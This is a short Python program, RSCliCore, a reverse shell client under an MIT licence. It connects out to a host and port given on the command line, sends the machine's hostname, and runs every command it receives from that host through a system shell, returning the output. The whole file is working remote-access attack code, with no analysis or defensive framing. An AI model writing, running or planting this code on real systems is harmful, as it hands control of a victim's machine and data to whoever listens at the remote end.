#!/usr/bin/env python

# MIT License
# 
# Copyright (c) 2017 Dan Persons (dpersonsdev@gmail.com)
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from argparse import ArgumentParser
import socket
from sys import exit
from subprocess import check_output, STDOUT, CalledProcessError
from time import sleep


__version__ = '0.1'


class RSCliCore:

    def __init__(self):
        """Initialize a shell client"""

        self.args = None
        self.arg_parser = ArgumentParser()


    def get_args(self):
        """Set argument options"""

        self.arg_parser.add_argument('--version', action = 'version',
                version = '%(prog)s ' + str(__version__))
        self.arg_parser.add_argument('--verbose',
                action = 'store_true', dest = 'verbose',
                help = ('enable terminal output'))
        self.arg_parser.add_argument('host',
                action = 'store',
                help = ('set the remote host'))
        self.arg_parser.add_argument('port',
                action = 'store', type=int,
                help = ('set the remote port'))

        self.args = self.arg_parser.parse_args()


    def main_event(self):
        """Send a shell to a remote host"""
        with socket.socket() as s:
            try:
                s.connect((self.args.host, self.args.port))
            except ConnectionRefusedError:
                print('Error: Connection refused for host '+ self.args.host + \
                        ' port ' + str(self.args.port) + '.')
                exit(1)
            s.send(bytes(socket.gethostname(), 'utf8'))
        
            while True:
                cmd = str(s.recv(1024))[2:-1]
                if cmd:
                    if self.args.verbose:
                        print(cmd)
                    if cmd == 'exit':
                        s.close()
                        exit(0)
                    else:
                        try:
                            procoutput = check_output(cmd, shell = True,
                                    stderr=STDOUT)
                        except CalledProcessError:
                            procoutput = bytes('Error: ' + cmd + \
                                    ' returned non-zero exit code.\n', 'utf8')
                        if procoutput:
                            s.send(procoutput)
                        else:
                            s.send(bytes('\n', 'utf8'))
                else:
                    sleep(0.1)


    def run_script(self):
        """Run the shell client program"""
        try:
            self.get_args()
            self.main_event()

        except KeyboardInterrupt:
            print('\nExiting on KeyboardInterrupt')


def main():
    thing = RSCliCore()
    thing.run_script()


if __name__ == "__main__":
    main()
